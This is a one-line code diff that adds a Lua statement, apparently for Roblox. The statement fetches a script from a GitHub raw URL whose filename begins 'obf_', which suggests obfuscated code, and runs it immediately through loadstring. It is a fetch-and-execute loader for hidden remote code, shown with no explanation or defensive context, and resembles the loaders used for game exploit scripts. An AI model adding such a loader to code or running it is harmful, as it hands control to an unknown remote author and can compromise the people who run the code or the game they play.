@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Venera0/mix/main/obf_WA9NBws8xSk1h5hFOPNUvOxk73e255V97i5R204I1u6F5gMO81rPdW6WHj4AsF07.lua'))()
